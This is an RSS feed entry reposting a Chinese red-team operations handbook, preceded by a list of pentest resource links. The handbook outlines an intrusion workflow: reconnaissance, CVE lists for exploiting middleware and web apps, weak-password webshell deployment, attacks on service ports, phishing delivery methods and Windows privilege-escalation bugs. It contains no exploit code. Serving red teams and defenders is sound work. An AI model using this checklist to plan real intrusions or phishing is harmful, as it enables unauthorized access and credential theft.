&lt;li&gt;&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly93d3cuY29tcHV0ZXJob3BlLmNvbS93bWljLmh0bQ==&#34;&gt;WMIC reference/guide&lt;/span&gt;&lt;/li&gt;
&lt;li&gt;&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly9kb2NzLm1pY3Jvc29mdC5jb20vZW4tdXMvc3lzaW50ZXJuYWxzLw==&#34;&gt;SysInternals&lt;/span&gt; - this is a must have for working on Windows boxes.&lt;/li&gt;
&lt;li&gt;&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly9naXRodWIuY29tL1Bvd2VyU2hlbGxNYWZpYS9Qb3dlclNwbG9pdA==&#34;&gt;PowerSploit&lt;/span&gt;&lt;/li&gt;
&lt;li&gt;&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cDovL3d3dy5ncmV5aGF0aGFja2VyLm5ldC8/cD03Mzg=&#34;&gt;Elevating privileges by exploiting weak folder permissions&lt;/span&gt;&lt;/li&gt;
&lt;li&gt;&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cDovL3d3dy5jYXJuYWwwd25hZ2UuY29tL3BhcGVycy9MQVJFUy1Db2xkRnVzaW9uLnBkZg==&#34;&gt;ColdFusion for PenTesters&lt;/span&gt;&lt;/li&gt;
&lt;li&gt;&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cDovL3d3dy5nbnVjaXRpemVuLm9yZy9ibG9nL2NvbGRmdXNpb24tZGlyZWN0b3J5LXRyYXZlcnNhbC1mYXEtY3ZlLTIwMTAtMjg2MS8=&#34;&gt;ColdFusion Path Traversal&lt;/span&gt;&lt;/li&gt;
&lt;li&gt;&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly9oaWdob24uY29mZmVlL2Jsb2cvcGVuZXRyYXRpb24tdGVzdGluZy10b29scy1jaGVhdC1zaGVldC8=&#34;&gt;Penetration Testing Tools Cheat Sheet&lt;/span&gt; - Good read. Check out other cheat sheets on this page too!&lt;/li&gt;
&lt;li&gt;&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly9naXRodWIuY29tL2t1cm9iZWF0cy9maW1hcA==&#34;&gt;fimap&lt;/span&gt; - LFI/RFI scanner&lt;/li&gt;
&lt;li&gt;&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly9naXRodWIuY29tL3p0Z3JhY2UvY2hhbmdlbWU=&#34;&gt;Changeme&lt;/span&gt; - default password scanner&lt;/li&gt;
&lt;li&gt;&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly9jaXJ0Lm5ldC9wYXNzd29yZHM=&#34;&gt;CIRT Default Passwords DB&lt;/span&gt;&lt;/li&gt;
&lt;li&gt;&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cDovL3Jlc291cmNlcy5pbmZvc2VjaW5zdGl0dXRlLmNvbS9sb2NhbC1maWxlLWluY2x1c2lvbi1jb2RlLWV4ZWN1dGlvbg==&#34;&gt;From LFI to Shell&lt;/span&gt;&lt;/li&gt;
&lt;li&gt;&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly9oaWdob24uY29mZmVlL2Jsb2cvbGludXgtY29tbWFuZHMtY2hlYXQtc2hlZXQv&#34;&gt;Useful Linux commands&lt;/span&gt;&lt;/li&gt;
&lt;li&gt;&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly93d3cucmVib290dXNlci5jb20vP3A9MTYyMw==&#34;&gt;Local Linux Enumeration&lt;/span&gt;&lt;/li&gt;
&lt;li&gt;&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly9uZXRzZWMud3MvP3A9MzMx&#34;&gt;Creating Metasploid Payloads&lt;/span&gt;&lt;/li&gt;
&lt;li&gt;&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly9naXRodWIuY29tL211Yml4L3NoZWxsc2hvY2tlci1wb2Nz&#34;&gt;Shellshock PoCs&lt;/span&gt;&lt;/li&gt;
&lt;/ul&gt;
 ]]></description>
        </item>
        <item>
            <guid isPermalink="true">https://or0kit.github.io/PenetrationTest/Reference/RedTeamer/</guid>
            <title>红方人员实战手册【转】</title>
            <link>https://or0kit.github.io/PenetrationTest/Reference/RedTeamer/</link>
            <category>RedTeam</category>
            <pubDate>Mon, 18 Jan 2021 15:13:54 +0800</pubDate>
            <description><![CDATA[ &lt;h1 id=&#34;红方人员实战手册&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#红方人员实战手册&#34;&gt;#&lt;/a&gt; 红方人员实战手册&lt;/h1&gt;
&lt;h2 id=&#34;声明&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#声明&#34;&gt;#&lt;/a&gt; 声明&lt;/h2&gt;
&lt;pre&gt;&lt;code&gt;Author : By klion
Date   : 2020.2.15
寄语    : 愿 2020 后面的每一天都能一切安好

&lt;/code&gt;&lt;/pre&gt;
&lt;h2 id=&#34;分享初衷&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#分享初衷&#34;&gt;#&lt;/a&gt; 分享初衷&lt;/h2&gt;
&lt;pre&gt;&lt;code&gt;一来, 旨在为 &amp;quot;攻击&amp;quot; / &amp;quot;防御&amp;quot;方 提供更加全面实用的参考
还是那句老闲话 &amp;quot;未知攻焉知防&amp;quot;, 所有单纯去说 &amp;quot;攻&amp;quot; 或者 &amp;quot;防&amp;quot; 的都是耍流氓, 攻守兼备才能把路越走越宽

二来, 也是为秉承共享协作, 希望能为 红队 及 部分实战攻防研究人员 做出自己应有的贡献
个人一直坚信, 真正的价值来源于实实在在的奉献,与其天天到处嘴炮,不如静下心来多反思下自己,好好踏踏实实做些对大家都有益的事

&lt;/code&gt;&lt;/pre&gt;
&lt;h2 id=&#34;丑话说在前面&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#丑话说在前面&#34;&gt;#&lt;/a&gt; 丑话说在前面&lt;/h2&gt;
&lt;pre&gt;&lt;code&gt;严禁任何 个人/组织机构 利用以下相关技术去从事任何未经合法授权的 网络入侵攻击破坏或者黑产活动
严禁任何 个人/组织机构 以此来进行任何形式的 商业牟利 或 恶意炒作行为,包括各类非法渗透培训,误人子弟的负面恶意引导等....
严禁一切的恶意传播及非法利用,由此所产生的一切恶果也均由读者自行承担

&lt;/code&gt;&lt;/pre&gt;
&lt;h2 id=&#34;说明&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#说明&#34;&gt;#&lt;/a&gt; 说明&lt;/h2&gt;
&lt;pre&gt;&lt;code&gt;以下仅针对日常 &amp;quot;红队&amp;quot; 场景, 进行了一次相对全面完整的实战攻击利用技术提炼汇总
针对不同的渗透阶段,所可能会用到的一些技术都做了详尽梳理说明 (后面可能还会整理出对应的完整工具链,虽然那不是最主要的)
由于红队不同于一般的渗透测试, 强调更多的是如何搞进去拿到相应机器权限 或者 实现某特定目的
而不局限于你一定要在什么时间, 用什么技术 或者 必须通过什么途径去搞,相比传统渗透测试,红队则更趋于真实的入侵活动
这种场景其实对防御者的 实战对抗经验 和 技术深度 都是比较大的挑战
所以,以下的所有技术点也几乎都是完全站在这种场景和角度下来考量梳理的
需要特别说明的是, 所有攻击手法在现实中都绝不是完全孤立使用的, 往往很多手法都是相互灵活组合起来进行循环利用
由于绝大部分内容都是基于本人平时学习实战积累的一些经验,加之每个人的实际渗透思路都不同
所以肯定会有遗漏的地方,也欢迎弟兄们一起来积极指正补充完善
个人觉得,最好的防御永远不是怎么去防某个工具,是个明白人都知道,因为工具这些东西本身就是死的
稍微改下,定制下, 现有的规则可能马上就防不住了,且一直会处于疲于应付的被动防御状态
尤其是针对红队这种特殊场景的,你的实际对手很可能都是有一定技术实力的人
所以针对每种核心的攻击技术技术展开做深入分析, 直接从源头上进行防御才是最靠谱的
虽然说短期这种成本代价相对较高, 但长期来看, 是一劳永逸的, 沉淀下来的这些东西最终也会慢慢形成自己产品的核心竞争力和特色
说白点,这种对抗,本质上拼的还是双方的技术实力,不仅要能在不知觉的情况下搞进去,而且要能无限制加大对方后期的溯源成本
另外,作为一名合格的攻防人员,工具的熟练掌握仅仅只是极小的一部分,对各种利用原理的深度理解和二次定制能力才是你的核心

&lt;/code&gt;&lt;/pre&gt;
&lt;h2 id=&#34;日常流程简要说明&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#日常流程简要说明&#34;&gt;#&lt;/a&gt; 日常流程简要说明&lt;/h2&gt;
&lt;pre&gt;&lt;code&gt;入口权限 =&amp;gt; 内网搜集/探测 =&amp;gt; 免杀提权[非必须] =&amp;gt; 抓取登录凭证 =&amp;gt; 跨平台横向 =&amp;gt; 入口维持 =&amp;gt; 数据回传 =&amp;gt; 定期权限维护

&lt;/code&gt;&lt;/pre&gt;
&lt;h2 id=&#34;0x01-入口权限获取-前期侦察搜集阶段本身就不存在太多可防御的点非防御重心&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#0x01-入口权限获取-前期侦察搜集阶段本身就不存在太多可防御的点非防御重心&#34;&gt;#&lt;/a&gt; 0x01 入口权限获取 [前期侦察，搜集阶段本身就不存在太多可防御的点，非防御重心]&lt;/h2&gt;
&lt;pre&gt;&lt;code&gt;绕CDN找出目标所有真实ip段
找目标的各种Web管理后台登录口
批量抓取目标所有真实C段 Web banner
批量对目标所有真实C段 进行基础服务端口扫描探测识别
尝试目标DNS是否允许区域传送,如果不允许则继续尝试子域爆破
批量抓取目标所有子域 Web banner
批量对目标所有子域集中进行基础服务端口探测识别
批量识别目标 所有存活Web站点的Web程序指纹 及其详细版本
从 Git 中查找目标泄露的各类 敏感文件 及 账号密码,偶尔甚至还能碰到目标不小心泄露的各种云的 &amp;quot;AccessKey&amp;quot;
从网盘 / 百度文库 中查找目标泄露的各类 敏感文件 及 账号密码
从各第三方历史漏洞库中查找目标曾经泄露的 各种敏感账号密码 [ 国内目标很好使 ]
目标Svn里泄露的各类 敏感文件
网站目录扫描 [ 查找目标网站泄露的各类敏感文件, 网站备份文件, 敏感配置文件, 源码 , 别人的webshell, 等等等...]
目标站点自身在前端代码中泄露的各种敏感信息
fofa / shodan / bing / google  hacking 深度利用
搜集目标 学生学号 / 员工工号 / 目标邮箱 [ 并顺手到各个社工库中去批量查询这些邮箱曾经是否泄露过密码 ]
目标自己对外提供的各种 技术文档 / wiki 里泄露的各种账号密码及其它敏感信息
目标微信小程序
分析目标app Web请求
借助js探针搜集目标内网信息
想办法混入目标的各种 内部QQ群 / 微信群
分析目标直接供应商 [尤其是技术外包]
根据前面已搜集到的各类信息制作有针对性的弱口令字典
目标所用 Waf 种类识别 与 绕过
BypassWAF 文件上传 / 读取 / 下载
   BypassWAF Sql注入
   BypassWAF RCE
   BypassWAF 各类Java Web中间件已知Nday漏洞利用
   BypassWAF Webshell 免杀
	
其它更多 , 待补充修正...

&lt;/code&gt;&lt;/pre&gt;
&lt;h2 id=&#34;0x02-入口权限获取-外部防御重心-重中之重&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#0x02-入口权限获取-外部防御重心-重中之重&#34;&gt;#&lt;/a&gt; 0x02 入口权限获取 [外部防御重心 ( &amp;quot;重中之重&amp;quot;) ]&lt;/h2&gt;
&lt;pre&gt;&lt;code&gt;此阶段,主要是针对各主流 &amp;quot;中间件 + 开源程序 + Web服务组件&amp;quot; 自身的各种已知Nday漏洞利用
如下已按 &amp;quot;实际攻击利用的难易程度&amp;quot; 及 &amp;quot;获取到的shell权限高低&amp;quot; 为标准进行了详细排序,由于完全以实战利用为导向
故,仅仅只挑选了一些相对会经常遇到的,且实战中确实能有效协助快速getshell 的 &amp;quot;中间件&amp;quot; , &amp;quot;开源程序&amp;quot; 及 &amp;quot;web组件&amp;quot;

&lt;/code&gt;&lt;/pre&gt;
&lt;h2 id=&#34;针对各类java中间件的各种已知nday漏洞利用&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#针对各类java中间件的各种已知nday漏洞利用&#34;&gt;#&lt;/a&gt; 针对各类 Java 中间件的各种已知 Nday 漏洞利用&lt;/h2&gt;
&lt;pre&gt;&lt;code&gt;不同于其它脚本类web程序,Java的运行权限通常都比较高,甚至大部分都是直接用root/administrator/system权限在跑
所以拿到的shell权限一般也非常高,通常都直接是服务器权限
尤其是在各种红队场景中,入侵者一般也都会首选这些点,并以此为突破口来获取一个稳定的跳板机入口权限
关于到底哪些行业特别爱用哪些中间件,这些也应该都是有事先分析梳理汇总好的

&lt;/code&gt;&lt;/pre&gt;
&lt;ul&gt;
&lt;li&gt;Struts2&lt;/li&gt;
&lt;/ul&gt;
&lt;pre&gt;&lt;code&gt;Struts2-005
Struts2-008
Struts2-009
Struts2-013
Struts2-016(实际上,很多都老系统都漏补了这个洞,成功率较高)
Struts2-019
Struts2-020
Struts2-devmode
Struts2-032
Struts2-033
Struts2-037
Struts2-045
Struts2-046
Struts2-048
Struts2-052
Struts2-053
Struts2-057

&lt;/code&gt;&lt;/pre&gt;
&lt;ul&gt;
&lt;li&gt;weblogic&lt;/li&gt;
&lt;/ul&gt;
&lt;pre&gt;&lt;code&gt;CVE-2019-2725
CVE-2019-2729
CVE-2018-3191
CVE-2018-2628
CVE-2018-2893
CVE-2018-2894
CVE-2017-3506
CVE-2017-10271
CVE-2017-3248
CVE-2016-0638
CVE-2016-3510
CVE-2015-4852
CVE-2014-4210

SSRF
控制台弱口令,部署webshell

&lt;/code&gt;&lt;/pre&gt;
&lt;ul&gt;
&lt;li&gt;Jboss&lt;/li&gt;
&lt;/ul&gt;
&lt;pre&gt;&lt;code&gt;CVE-2015-7501
CVE-2017-7504
CVE-2017-12149

未授权访问,部署webshell
控制台弱口令,部署webshell

&lt;/code&gt;&lt;/pre&gt;
&lt;ul&gt;
&lt;li&gt;wildfly [jboss 7.x 改名为 wildfly]&lt;/li&gt;
&lt;/ul&gt;
&lt;pre&gt;&lt;code&gt;控制台弱口令,部署webshell

&lt;/code&gt;&lt;/pre&gt;
&lt;ul&gt;
&lt;li&gt;Tomcat&lt;/li&gt;
&lt;/ul&gt;
&lt;pre&gt;&lt;code&gt;CVE-2016-8735
CVE-2017-12615 [ readonly 实际设为 true的情况较少,稍鸡肋 ]
CVE-2020-1938 [ AJP协议漏洞, 直接把8009端口暴露在外网的不太多,稍鸡肋 ]

控制台弱口令,部署webshelll [ 注: 7.x版本后,默认加了防爆机制 ]

&lt;/code&gt;&lt;/pre&gt;
&lt;ul&gt;
&lt;li&gt;Jekins&lt;/li&gt;
&lt;/ul&gt;
&lt;pre&gt;&lt;code&gt;CVE-2018-1999002 [任意文件读取]

未授权访问,任意命令执行
控制台弱口令,任意命令执行

&lt;/code&gt;&lt;/pre&gt;
&lt;ul&gt;
&lt;li&gt;ElasticSearch&lt;/li&gt;
&lt;/ul&gt;
&lt;pre&gt;&lt;code&gt;CVE-2014-3120 [专门针对老版本(无沙盒)RCE]
CVE-2015-1427 [Groovy RCE]
CVE-2015-3337 [任意文件读取]

未授权访问,敏感信息泄露

&lt;/code&gt;&lt;/pre&gt;
&lt;ul&gt;
&lt;li&gt;RabbitMQ&lt;/li&gt;
&lt;/ul&gt;
&lt;pre&gt;&lt;code&gt;弱口令

&lt;/code&gt;&lt;/pre&gt;
&lt;ul&gt;
&lt;li&gt;Glassfish&lt;/li&gt;
&lt;/ul&gt;
&lt;pre&gt;&lt;code&gt;任意文件读取 [ 低版本 ]
控制台弱口令,部署webshell

&lt;/code&gt;&lt;/pre&gt;
&lt;ul&gt;
&lt;li&gt;IBM Websphere&lt;/li&gt;
&lt;/ul&gt;
&lt;pre&gt;&lt;code&gt;Java 反序列化
控制台弱口令,部署webshell

&lt;/code&gt;&lt;/pre&gt;
&lt;ul&gt;
&lt;li&gt;Axis2&lt;/li&gt;
&lt;/ul&gt;
&lt;pre&gt;&lt;code&gt;任意文件读取
目录遍历

&lt;/code&gt;&lt;/pre&gt;
&lt;ul&gt;
&lt;li&gt;Apache ActiveMQ&lt;/li&gt;
&lt;/ul&gt;
&lt;pre&gt;&lt;code&gt;未授权访问,5.12 之前的版本 fileserver存在 PUT任意写
CVE-2015-5254

&lt;/code&gt;&lt;/pre&gt;
&lt;ul&gt;
&lt;li&gt;Apache Solr&lt;/li&gt;
&lt;/ul&gt;
&lt;pre&gt;&lt;code&gt;CVE-2017-12629
CVE-2019-0193 [ Apache Solr 5.x - 8.2.0 ]

&lt;/code&gt;&lt;/pre&gt;
&lt;ul&gt;
&lt;li&gt;Apache Zookeeper&lt;/li&gt;
&lt;/ul&gt;
&lt;pre&gt;&lt;code&gt;未授权访问,敏感信息泄露

&lt;/code&gt;&lt;/pre&gt;
&lt;ul&gt;
&lt;li&gt;Apache Shiro 反序列化&lt;/li&gt;
&lt;li&gt;fastjson &amp;lt;= 1.2.47 反序列化利用&lt;/li&gt;
&lt;/ul&gt;
&lt;h2 id=&#34;针对各类windows-php集成环境-由于此类环境拿到的webshell权限相对较高所以通常也是红队人员的首选突破口&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#针对各类windows-php集成环境-由于此类环境拿到的webshell权限相对较高所以通常也是红队人员的首选突破口&#34;&gt;#&lt;/a&gt; 针对各类 Windows php 集成环境  [由于此类环境拿到的 Webshell 权限相对较高，所以，通常也是红队人员的首选突破口]&lt;/h2&gt;
&lt;pre&gt;&lt;code&gt;AppServ
Xampp
宝塔
PhpStudy		
......

&lt;/code&gt;&lt;/pre&gt;
&lt;h2 id=&#34;针对各类开源程序的-已知nday漏洞利用&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#针对各类开源程序的-已知nday漏洞利用&#34;&gt;#&lt;/a&gt; 针对各类开源程序的 已知 Nday 漏洞利用&lt;/h2&gt;
&lt;pre&gt;&lt;code&gt;Dedecms 	后台弱口令,系列已知nday漏洞利用
thinkphp 5.x 	后台弱口令,系列已知nday漏洞利用
phpcms 		后台弱口令,系列已知nday漏洞利用
ecshop 		后台弱口令,系列已知nday漏洞利用
Metinfo 	后台弱口令,系列已知nday漏洞利用
discuz 		后台弱口令,系列已知nday漏洞利用
帝国cms 	后台弱口令,系列已知nday漏洞利用
phpmyadmin 	数据库弱口令,系列已知nday漏洞利用
wordpress 	后台弱口令,系列已知nday漏洞利用
joomla 		后台弱口令,系列已知nday漏洞利用
drupal 		CVE-2018-7600 ,后台弱口令,系列已知nday漏洞利用
......

&lt;/code&gt;&lt;/pre&gt;
&lt;h2 id=&#34;针对其它各类web组件的-已知nday漏洞利用&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#针对其它各类web组件的-已知nday漏洞利用&#34;&gt;#&lt;/a&gt; 针对其它各类 Web 组件的 已知 Nday 漏洞利用&lt;/h2&gt;
&lt;ul&gt;
&lt;li&gt;IIS 6.0 RCE&lt;/li&gt;
&lt;/ul&gt;
&lt;pre&gt;&lt;code&gt;短文件漏洞
PUT 任意写
Webdav RCE CVE-2017-7269

&lt;/code&gt;&lt;/pre&gt;
&lt;ul&gt;
&lt;li&gt;禅道项目管理系统&lt;/li&gt;
&lt;/ul&gt;
&lt;pre&gt;&lt;code&gt;SQL注入
文件读取
远程执行

&lt;/code&gt;&lt;/pre&gt;
&lt;ul&gt;
&lt;li&gt;通达 OA&lt;/li&gt;
&lt;/ul&gt;
&lt;pre&gt;&lt;code&gt;SQL注入
任意上传

&lt;/code&gt;&lt;/pre&gt;
&lt;ul&gt;
&lt;li&gt;Exchange&lt;/li&gt;
&lt;/ul&gt;
&lt;pre&gt;&lt;code&gt;利用接口进行邮箱用户名枚举
针对各个接口的弱口令爆破
CVE-2020-0688 [ 利用前提是需要先得有任意一个邮箱用户权限 ]
....

&lt;/code&gt;&lt;/pre&gt;
&lt;ul&gt;
&lt;li&gt;Zimbra [ XXE + SSRF =&amp;gt; RCE ]&lt;/li&gt;
&lt;/ul&gt;
&lt;pre&gt;&lt;code&gt;CVE-2013-7091
CVE-2016-9924
CVE-2019-9670

&lt;/code&gt;&lt;/pre&gt;
&lt;ul&gt;
&lt;li&gt;Citrix&lt;/li&gt;
&lt;/ul&gt;
&lt;pre&gt;&lt;code&gt;CVE-2019-19781

&lt;/code&gt;&lt;/pre&gt;
&lt;ul&gt;
&lt;li&gt;Jumpserver&lt;/li&gt;
&lt;/ul&gt;
&lt;pre&gt;&lt;code&gt;身份验证绕过

&lt;/code&gt;&lt;/pre&gt;
&lt;ul&gt;
&lt;li&gt;Zabbix&lt;/li&gt;
&lt;/ul&gt;
&lt;pre&gt;&lt;code&gt;CVE-2017-2824
SQL注入 [ 2.0 老版本 ]
控制台弱口令,敏感机器信息泄露

&lt;/code&gt;&lt;/pre&gt;
&lt;ul&gt;
&lt;li&gt;Cacti&lt;/li&gt;
&lt;/ul&gt;
&lt;pre&gt;&lt;code&gt;低版本 SQL注入
控制台弱口令

&lt;/code&gt;&lt;/pre&gt;
&lt;ul&gt;
&lt;li&gt;Nagios&lt;/li&gt;
&lt;/ul&gt;
&lt;pre&gt;&lt;code&gt;CVE-2016-9565
控制台弱口令

&lt;/code&gt;&lt;/pre&gt;
&lt;ul&gt;
&lt;li&gt;Webmin RCE&lt;/li&gt;
&lt;/ul&gt;
&lt;pre&gt;&lt;code&gt;CVE-2019-15107 

&lt;/code&gt;&lt;/pre&gt;
&lt;ul&gt;
&lt;li&gt;PHPMailer&lt;/li&gt;
&lt;/ul&gt;
&lt;pre&gt;&lt;code&gt;CVE-2016-10033

&lt;/code&gt;&lt;/pre&gt;
&lt;ul&gt;
&lt;li&gt;泛微 OA 远程代码执行&lt;/li&gt;
&lt;li&gt;金蝶 OA SQL 注入&lt;/li&gt;
&lt;li&gt;Coremail 敏感文件泄露&lt;/li&gt;
&lt;li&gt;UEditor 任意文件上传&lt;/li&gt;
&lt;li&gt;OpenSSL 心脏滴血抓明文账号密码  [Heartbleed]&lt;/li&gt;
&lt;li&gt;破壳漏洞 [Shellshock]&lt;/li&gt;
&lt;/ul&gt;
&lt;h2 id=&#34;各种能快速getshell的常规基础web漏洞利用-注-有些漏洞在不审代码的情况下其实是很难有效盲测到的&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#各种能快速getshell的常规基础web漏洞利用-注-有些漏洞在不审代码的情况下其实是很难有效盲测到的&#34;&gt;#&lt;/a&gt; 各种能快速 getshell 的常规基础 Web 漏洞利用 [注：有些漏洞在不审代码的情况下其实是很难有效盲测到的]&lt;/h2&gt;
&lt;pre&gt;&lt;code&gt;后台弱口令
SSRF
sql注入
越权
命令 / 代码执行 / 反序列化
任意文件上传 / 下载 / 读取
包含
XSS（实际上,XSS只有在针对某些特定邮箱,手里有浏览器0day时价值才会比较大,红队场景下其实并不是非常致命)
业务逻辑漏洞

&lt;/code&gt;&lt;/pre&gt;
&lt;h2 id=&#34;针对各类边界网络设备的各种利用主要是web管理控制台登录弱口令-及-各类已知nday攻击利用&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#针对各类边界网络设备的各种利用主要是web管理控制台登录弱口令-及-各类已知nday攻击利用&#34;&gt;#&lt;/a&gt; 针对各类边界网络设备的各种利用，主要是 Web 管理控制台登录弱口令 及 各类已知 nday 攻击利用&lt;/h2&gt;
&lt;ul&gt;
&lt;li&gt;Pulse Secure VPN&lt;/li&gt;
&lt;/ul&gt;
&lt;pre&gt;&lt;code&gt;CVE-2019-11510 [ 任意文件读取 ]

&lt;/code&gt;&lt;/pre&gt;
&lt;ul&gt;
&lt;li&gt;Fortinet VPN&lt;/li&gt;
&lt;/ul&gt;
&lt;pre&gt;&lt;code&gt;CVE-2018-13379 [ 文件读取 ]

&lt;/code&gt;&lt;/pre&gt;
&lt;ul&gt;
&lt;li&gt;Sangfor Vpn RCE&lt;/li&gt;
&lt;/ul&gt;
&lt;h2 id=&#34;0x03-入口权限获取-专门针对各类基础服务端口的各种getshell利用防御重点-重中之重&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#0x03-入口权限获取-专门针对各类基础服务端口的各种getshell利用防御重点-重中之重&#34;&gt;#&lt;/a&gt; 0x03 入口权限获取 [专门针对各类基础服务端口的各种 getshell 利用，防御重点 ( &amp;quot;重中之重&amp;quot;) ]&lt;/h2&gt;
&lt;pre&gt;&lt;code&gt;此处仅仅只挑选了一些实战中真正能协助快速getshell的服务,其它的一些相对边缘性的服务均未提及 
同样,已按 &amp;quot;实际攻击利用的难易程度&amp;quot; 及 &amp;quot;获取到的shell权限高低&amp;quot; 为标准进行了详细排序
如下,就每个端口的具体攻击利用方式,进行了简要说明

&lt;/code&gt;&lt;/pre&gt;
&lt;ul&gt;
&lt;li&gt;Top Port List&lt;/li&gt;
&lt;/ul&gt;
&lt;pre&gt;&lt;code&gt;Mssql 	  [ 默认工作在tcp 1433端口, 弱口令, 敏感账号密码泄露, 提权, 远程执行, 后门植入 ]
SMB       [ 默认工作在tcp 445端口, 弱口令, 远程执行, 后门植入 ]
WMI       [ 默认工作在tcp 135端口, 弱口令, 远程执行, 后门植入 ]
WinRM	  [ 默认工作在tcp 5985端口, 此项主要针对某些高版本Windows, 弱口令, 远程执行, 后门植入 ]
RDP       [ 默认工作在tcp 3389端口, 弱口令, 远程执行, 别人留的shift类后门 ]
SSH       [ 默认工作在tcp 22端口, 弱口令, 远程执行, 后门植入 ]
ORACLE    [ 默认工作在tcp 1521端口, 弱口令, 敏感账号密码泄露, 提权, 远程执行, 后门植入 ]
Mysql     [ 默认工作在tcp 3306端口, 弱口令, 敏感账号密码泄露, 提权(只适用于部分老系统) ]
REDIS	  [ 默认工作在tcp 6379端口, 弱口令, 未授权访问, 写文件(webshell,启动项,计划任务), 提权 ]
POSTGRESQL[ 默认工作在tcp 5432端口, 弱口令, 敏感信息泄露 ]
LDAP      [ 默认工作在tcp 389端口, 未授权访问, 弱口令, 敏感账号密码泄露 ]
SMTP      [ 默认工作在tcp 25端口, 服务错误配置导致的用户名枚举漏洞, 弱口令, 敏感信息泄露 ]
POP3      [ 默认工作在tcp 110端口, 弱口令, 敏感信息泄露 ]
IMAP      [ 默认工作在tcp 143端口, 弱口令, 敏感信息泄露 ]
Exchange  [ 默认工作在tcp 443端口, 接口弱口令爆破 eg: Owa,ews,oab,AutoDiscover... pth脱邮件, 敏感信息泄露 ... ]
VNC       [ 默认工作在tcp 5900端口, 弱口令 ]
FTP       [ 默认工作在tcp 21端口, 弱口令, 匿名访问/可写, 敏感信息泄露 ]
Rsync     [ 默认工作在tcp 873端口, 未授权, 弱口令, 敏感信息泄露 ]
Mongodb   [ 默认工作在tcp 27017端口, 未授权, 弱口令 ]
TELNET    [ 默认工作在tcp 23端口, 弱口令, 后门植入 ]
SVN       [ 默认工作在tcp 3690端口, 弱口令, 敏感信息泄露 ]
JAVA RMI  [ 默认工作在tcp 1099端口, 可能存在反序列化利用 ]
CouchDB   [ 默认工作在tcp 5984端口, 未授权访问 ]

&lt;/code&gt;&lt;/pre&gt;
&lt;h2 id=&#34;0x04-入口权限获取&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#0x04-入口权限获取&#34;&gt;#&lt;/a&gt; 0x04 入口权限获取&lt;/h2&gt;
&lt;h2 id=&#34;传统钓鱼攻击利用实际护网场景中用的非常频繁细节非常多此处不一一列举防御重点&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#传统钓鱼攻击利用实际护网场景中用的非常频繁细节非常多此处不一一列举防御重点&#34;&gt;#&lt;/a&gt; 传统钓鱼攻击利用，实际护网场景中用的非常频繁，细节非常多，此处不一一列举，防御重点&lt;/h2&gt;
&lt;ul&gt;
&lt;li&gt;发信前期准备&lt;/li&gt;
&lt;/ul&gt;
&lt;pre&gt;&lt;code&gt;枚举有效的目标邮箱用户名列表
批量探测目标邮箱弱口令
伪造发信人 [ 发信邮服搭建 ]
钓鱼信 [ 针对不同行业一般也都会事先准备好各种各样的针对性的发信话术模板,以此来提到实际发信成功率 ]
......

&lt;/code&gt;&lt;/pre&gt;
&lt;ul&gt;
&lt;li&gt;典型投递方式&lt;/li&gt;
&lt;/ul&gt;
&lt;pre&gt;&lt;code&gt;第一种,直接给目标发送各种常规木马信 

传统宏利用
捆绑
exe[zip,7z]
lnk
chm
自解压
木马链接
OLE
CVE-2017-11882 [ 利用漏洞触发 ]
...

&lt;/code&gt;&lt;/pre&gt;
&lt;pre&gt;&lt;code&gt;第二种,给目标发送各种钓鱼链接,比如, 利用各种目标登录口的钓鱼页面来窃取各种内网账号密码 

Vpn
Mail
OA
Net ntlm hash [ 远程模板注入,pdf...钓hash,国内ISP过滤SMB流量不适用 ]
......

&lt;/code&gt;&lt;/pre&gt;
&lt;h2 id=&#34;0x05-主机安全-提权利用防御重点&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#0x05-主机安全-提权利用防御重点&#34;&gt;#&lt;/a&gt; 0x05 主机安全 [提权利用，防御重点]&lt;/h2&gt;
&lt;pre&gt;&lt;code&gt;以下只单独挑了一些在 通用性, 稳定性, 易用性, 实际成功率 都相对较好的洞 和 方式 其它的一些&amp;quot;边缘性&amp;quot;的利用都暂未提及

&lt;/code&gt;&lt;/pre&gt;
&lt;ul&gt;
&lt;li&gt;Windows 系统漏洞 本地提权 [成功的前提是，保证事先已做好各种针对性免杀]&lt;/li&gt;
&lt;/ul&gt;
&lt;pre&gt;&lt;code&gt;BypassUAC [ win7 / 8  / 8.1 / 10 ]
MS14-058[KB3000061]				    [重点]
MS14-068[KB3011780]				    [重点]
ms15-051[KB3045171]				    [重点]
MS15-077[KB3077657]				    [重点]
MS16-032[KB3124280]				    [重点]
ms16-075					    [重点]
MS16-135[KB3199135]				    [重点]
MS17-010[KB4013389]				    [重点]
cve-2019-0708					    [重点]
CVE-2019-0803					    [重点]
